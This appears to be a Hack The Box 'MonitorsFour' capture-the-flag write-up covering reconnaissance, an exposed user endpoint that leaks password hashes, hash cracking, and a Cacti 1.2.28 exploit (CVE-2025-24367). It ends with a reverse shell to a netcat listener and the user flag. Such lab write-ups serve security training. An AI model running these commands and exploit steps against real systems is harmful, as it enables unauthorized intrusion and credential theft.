# MonitorsFour-Write-UP
Hack The Box MonitorsFour is an Easy-rated Windows machine focused on web exploitation, credential discovery, container abuse, and Docker escape techniques. The lab teaches how multiple small misconfigurations can be chained into full system compromise.


	• Enumeration : Scan Port using nmap 
	
	CMD : nmap -sS <IP>
	<img width="616" height="213" alt="image" src="https://github.com/user-attachments/assets/8ff73fc1-d99d-48c1-8fc9-988006037e27" />

	
	Http - 80 
	WinRM - 5985
	
	• Explore Webpage : But not Open because it is Resolve to = monitorsfour.htb
	
	We can set IP and Domain name in /etc/hosts File.
	
	<img width="571" height="303" alt="image" src="https://github.com/user-attachments/assets/1e9f1671-35d7-40c2-88f2-d3aac5beeac1" />

	• Explore Again Http Web pages : In this Web Page Found Login Page 

	<img width="1547" height="799" alt="image" src="https://github.com/user-attachments/assets/0abdd684-3701-40db-97cc-83f455c26122" />

	
	
	
	• Identify Subdomains : Using TOOL = FFUF
	
	CMD :  ffuf -u http://monitorsfour.htb -H 'Host: FUZZ.monitorsfour.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -fs 138
	<img width="1337" height="488" alt="image" src="https://github.com/user-attachments/assets/3328e0c2-6d94-4154-bb0d-8e352ec016ae" />

	
	SUBDOMAIN : cacti 
	
	• Explore This Subdomain and Add In /etc/hosts file :
	<img width="1342" height="786" alt="image" src="https://github.com/user-attachments/assets/4b0099a8-3633-46dc-8c03-d515f1574719" />

	
	Founded This Login Page and this Login page Version
	
	Version : 1.2.28
	
	• Directory Busting : Using Tool = Gobuster 
	
	CMD :  gobuster dir -u http://monitorsfour.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt   -t 20 
	
	<img width="1283" height="407" alt="image" src="https://github.com/user-attachments/assets/2b851bf0-e085-4edf-90e6-439162d9665b" />

	
	See these Pages on = monitorsfour.htb URL
	
	• Check User Page :  
	<img width="1093" height="421" alt="image" src="https://github.com/user-attachments/assets/078e206a-c228-49e1-8497-3dbc0d3c0cac" />

	Missing Parameter Error 
	
	Try to ADD Token Parameter 
	
	/user?token=0
	<img width="1753" height="487" alt="image" src="https://github.com/user-attachments/assets/2d0ab7a8-f056-477d-ae60-210ee7eb2cf6" />

	
	Found a users Credential - Name , ID , HASH, Email, Role , etc. Details
	
	Analys Super User Role : Copy Password Hash 
	
	• Crack Password in Some Websites : crack station , Hashes.com 
	
	Hashes.com 
	<img width="1759" height="740" alt="image" src="https://github.com/user-attachments/assets/0664ffac-1c77-4566-ac99-167a5770b558" />

	
	Username = Admin 
	Password = Wonderful1
	
	• Login with monitorsfour.htb/login page :  
	<img width="1469" height="763" alt="image" src="https://github.com/user-attachments/assets/3f042327-89be-46f0-b75e-6891ed5a7673" />

	Login Success Ful
	
	• Login With cacti.monitorsfour.htb/cacti : 
	
	Username : marcus
	Password : wonderful1
	<img width="1825" height="685" alt="image" src="https://github.com/user-attachments/assets/dd6d347b-f8e3-4af0-8f9b-7b21ead737e9" />

	
	
	Login Success Ful
	
	
	
	• Find Version Exploit : on Browsers 
	
	Version : 1.2.28
	
	<img width="1732" height="867" alt="image" src="https://github.com/user-attachments/assets/4ca74d95-0d55-49c1-9317-0920178ed706" />

	We Found This Exploit - Cybergeek
	
	- CVE-2025-24367
	
	- Download Code - Exploit.py
	- Make it Executable 
	- Run with this Command : 
	
	ATTACKER
	CMD : python3 exploit.py -u marcus -p wonderful1 -i <ATTACKER-IP> -l 1234 -url http://cacti.monitorsfour.htb
	
	- Before this Command Start Listening on Netcap
	
	ATTACKER
	CMD : nc -nlvp 1234
	<img width="474" height="405" alt="image" src="https://github.com/user-attachments/assets/5a301051-e4a6-4deb-b411-11dd4cb8fea9" />

	
	
	ACCESS Successful : With User.txt
	
	
	
USER.TXT---------------------------------------------------------------FLAG{}-------------------------------------------------------------------------
<img width="1709" height="10106" alt="image" src="https://github.com/user-attachments/assets/00c36b09-12c1-46f8-92cb-7a03c5926190" />
